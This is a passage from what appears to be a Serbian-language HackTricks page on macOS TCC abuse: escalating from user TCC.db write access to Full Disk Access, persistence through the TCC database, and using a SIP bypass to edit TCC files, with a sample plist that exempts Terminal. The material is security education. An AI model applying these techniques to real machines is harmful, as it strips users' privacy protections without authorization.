Ako dobijete **dozvole za upis** u **korisničku TCC** bazu podataka, **ne možete** sebi dodeliti dozvole **`FDA`**; to može da dodeli samo ona koja se nalazi u sistemskoj bazi podataka.

Ali možete sebi dodeliti **Automation prava za Finder** i zloupotrebiti prethodnu tehniku da biste eskalirali do FDA\*.

### **FDA do TCC dozvola**

TCC naziv za **Full Disk Access** je **`kTCCServiceSystemPolicyAllFiles`**.

Mislim da ovo nije stvarni privesc, ali za svaki slučaj, ako vam bude korisno: Ako kontrolišete program koji ima FDA, možete **izmeniti korisničku TCC bazu podataka i sebi dodeliti bilo koji pristup**. Ovo može biti korisno kao tehnika za postojanost u slučaju da izgubite FDA dozvole.

### **Zaobilaženje SIP-a radi zaobilaženja TCC-a**

Sistemska **TCC baza podataka** zaštićena je pomoću **SIP-a**, zbog čega samo procesi sa **navedenim entitlement-ima mogu da je menjaju**. Zato će napadač, ako pronađe **zaobilaženje SIP-a** nad **fajlom** (tako da može da izmeni fajl ograničen SIP-om), moći da:

- **Ukloni zaštitu** TCC baze podataka i sebi dodeli sve TCC dozvole. Na primer, mogao bi da zloupotrebi bilo koji od ovih fajlova:
  - Sistemska TCC baza podataka
  - REG.db
  - MDMOverrides.plist

Međutim, postoji još jedan način da se ovo **zaobilaženje SIP-a iskoristi za zaobilaženje TCC-a**: fajl `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` sadrži listu dozvoljenih aplikacija kojima je potreban TCC izuzetak. Zato će, ako napadač može da **ukloni SIP zaštitu** sa ovog fajla i doda **sopstvenu aplikaciju**, ta aplikacija moći da zaobiđe TCC.\
Na primer, da biste dodali terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Detaljan pregled macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - skripta za praćenje com.apple.macl (Gist autora brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Praćenje i rešavanje problema sa com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Slučajno i namerno zaobilaženje macOS TCC zaštite privatnosti korisnika](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Promena matičnog direktorijuma i zaobilaženje TCC-a, poznato i kao CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL injection u TCC-u: zašto to (verovatno) nije predstavljalo bezbednosni rizik (ovog puta)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Lokacija i pribavljanje TCC.db datoteke u macOS-u](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Konfigurisanje macOS App Sandbox-a](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Ovlašćenje za kameru](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Podešavanja korisnog sadržaja za upravljanje uređajima pomoću kontrole pravila za privatnost na Apple uređajima](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Analiza upada u macOS od mamca do kompromitovanja](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
